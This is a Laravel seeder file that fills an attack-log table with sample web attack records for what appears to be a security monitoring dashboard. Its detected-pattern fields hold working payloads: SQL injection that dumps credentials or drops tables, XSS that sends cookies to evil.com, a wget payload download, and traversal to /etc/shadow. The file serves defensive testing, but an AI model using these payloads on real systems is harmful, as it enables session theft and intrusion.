<?php

namespace Database\Seeders;

use App\Models\AttackLog;
use Illuminate\Database\Seeder;

class AttackLogSeeder extends Seeder
{
    public function run(): void
    {
        $data = [
            // ========== DATA AWAL ==========
            // SQL Injection (4 data)
            [
                'ip_address' => '103.86.54.12',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => 'UNION SELECT',
                'endpoint' => '/products',
                'origin' => 'Indonesia',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '45.143.221.9',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => 'OR 1=1',
                'endpoint' => '/login',
                'origin' => 'Russia',
                'risk_level' => 'Critical',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '218.92.0.115',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => 'DROP TABLE users',
                'endpoint' => '/search',
                'origin' => 'China',
                'risk_level' => 'Critical',
                'action_taken' => 'Dropped',
            ],
            [
                'ip_address' => '197.210.76.41',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => 'WAITFOR DELAY',
                'endpoint' => '/api/products',
                'origin' => 'Nigeria',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],

            // XSS (3 data)
            [
                'ip_address' => '185.165.29.101',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '<script>alert("XSS")</script>',
                'endpoint' => '/contact',
                'origin' => 'Netherlands',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '5.188.62.7',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'javascript:alert',
                'endpoint' => '/search',
                'origin' => 'Russia',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],
            [
                'ip_address' => '36.67.250.44',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'onerror=',
                'endpoint' => '/profile',
                'origin' => 'Indonesia',
                'risk_level' => 'Low',
                'action_taken' => 'Allowed',
            ],

            // Path Traversal (2 data)
            [
                'ip_address' => '178.62.101.74',
                'kategori' => 'Path Traversal',
                'pola_terdeteksi' => '../etc/passwd',
                'endpoint' => '/download',
                'origin' => 'United Kingdom',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '177.53.148.89',
                'kategori' => 'Path Traversal',
                'pola_terdeteksi' => '..\\..\\windows\\system32\\cmd.exe',
                'endpoint' => '/public/files',
                'origin' => 'Brazil',
                'risk_level' => 'Critical',
                'action_taken' => 'Dropped',
            ],

            // Brute Force / Scanning (4 data)
            [
                'ip_address' => '104.248.135.22',
                'kategori' => 'Brute Force',
                'pola_terdeteksi' => 'wp-login.php',
                'endpoint' => '/wp-login.php',
                'origin' => 'United States',
                'risk_level' => 'Medium',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '128.199.209.56',
                'kategori' => 'Brute Force',
                'pola_terdeteksi' => '.env',
                'endpoint' => '/.env',
                'origin' => 'Singapore',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '82.102.21.145',
                'kategori' => 'Brute Force',
                'pola_terdeteksi' => 'phpmyadmin/',
                'endpoint' => '/phpmyadmin/',
                'origin' => 'Ukraine',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],
            [
                'ip_address' => '139.59.121.167',
                'kategori' => 'Brute Force',
                'pola_terdeteksi' => 'xmlrpc.php',
                'endpoint' => '/xmlrpc.php',
                'origin' => 'India',
                'risk_level' => 'Low',
                'action_taken' => 'Allowed',
            ],

            // RCE & Lainnya (4 data)
            [
                'ip_address' => '47.88.221.186',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'eval(base64_decode())',
                'endpoint' => '/api/execute',
                'origin' => 'China',
                'risk_level' => 'Critical',
                'action_taken' => 'Dropped',
            ],
            [
                'ip_address' => '185.234.14.77',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'cmd.exe /c dir',
                'endpoint' => '/debug',
                'origin' => 'Germany',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '202.51.107.22',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'wget http://malicious.com/payload',
                'endpoint' => '/cgi-bin/upload',
                'origin' => 'Indonesia',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '94.130.22.185',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'base64_decode("c3lzdGVt")',
                'endpoint' => '/admin',
                'origin' => 'Czech Republic',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],

            // ========== DATA TAMBAHAN ==========
            // --- XSS (7 data) ---
            [
                'ip_address' => '203.0.113.1',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '<img src=x onerror=alert(1)>',
                'endpoint' => '/gallery',
                'origin' => 'United States',
                'risk_level' => 'Critical',   // (Critical #1)
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '198.51.100.2',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'javascript:document.location="http://evil.com"',
                'endpoint' => '/redirect',
                'origin' => 'Canada',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '192.0.2.3',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '<svg onload=alert(1)>',
                'endpoint' => '/comment',
                'origin' => 'Germany',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],
            [
                'ip_address' => '203.0.113.4',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'alert(1) //',
                'endpoint' => '/search',
                'origin' => 'Indonesia',
                'risk_level' => 'Low',
                'action_taken' => 'Allowed',
            ],
            [
                'ip_address' => '198.51.100.5',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '"><script>fetch("http://evil.com?cookie="+document.cookie)</script>',
                'endpoint' => '/profile',
                'origin' => 'Japan',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '192.0.2.6',
                'kategori' => 'XSS',
                'pola_terdeteksi' => 'document.write("<img src=\'http://evil.com/?"+document.cookie+"\'">)',
                'endpoint' => '/feedback',
                'origin' => 'Brazil',
                'risk_level' => 'Critical',   // (Critical #2)
                'action_taken' => 'Dropped',
            ],
            [
                'ip_address' => '203.0.113.7',
                'kategori' => 'XSS',
                'pola_terdeteksi' => '"><body onload=alert(1)>',
                'endpoint' => '/post',
                'origin' => 'France',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],

            // --- SQL Injection (6 data) ---
            [
                'ip_address' => '198.51.100.10',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "' UNION SELECT null, username, password FROM users--",
                'endpoint' => '/login',
                'origin' => 'Russia',
                'risk_level' => 'Critical',   // (Critical #3)
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '192.0.2.11',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "'; DROP TABLE sessions; --",
                'endpoint' => '/api/logout',
                'origin' => 'China',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '203.0.113.12',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "' OR '1'='1' /*",
                'endpoint' => '/admin',
                'origin' => 'India',
                'risk_level' => 'Medium',
                'action_taken' => 'Logged',
            ],
            [
                'ip_address' => '198.51.100.13',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "1; WAITFOR DELAY '0:0:10'--",
                'endpoint' => '/products',
                'origin' => 'United Kingdom',
                'risk_level' => 'Critical',   // (Critical #4)
                'action_taken' => 'Dropped',
            ],
            [
                'ip_address' => '192.0.2.14',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "' AND SLEEP(5) AND '1'='1",
                'endpoint' => '/search',
                'origin' => 'Australia',
                'risk_level' => 'High',
                'action_taken' => 'Blocked',
            ],
            [
                'ip_address' => '203.0.113.15',
                'kategori' => 'SQL Injection',
                'pola_terdeteksi' => "' OR 1=1 INTO OUTFILE '/tmp/out' --",
                'endpoint' => '/export',
                'origin' => 'Netherlands',
                'risk_level' => 'Low',
                'action_taken' => 'Logged',
            ],

            // --- Path Traversal Critical (1 data) ---
            [
                'ip_address' => '198.51.100.20',
                'kategori' => 'Path Traversal',
                'pola_terdeteksi' => '../../../../etc/shadow',
                'endpoint' => '/download',
                'origin' => 'Ukraine',
                'risk_level' => 'Critical',   // (Critical #5)
                'action_taken' => 'Blocked',
            ],

            // --- Lainnya Critical (1 data) ---
            [
                'ip_address' => '203.0.113.25',
                'kategori' => 'Lainnya',
                'pola_terdeteksi' => 'cmd.exe /c whoami',
                'endpoint' => '/cgi-bin/exec',
                'origin' => 'North Korea',
                'risk_level' => 'Critical',   // (Critical #6)
                'action_taken' => 'Dropped',
            ],
        ];

        foreach ($data as $item) {
            AttackLog::create($item);
        }
    }
}
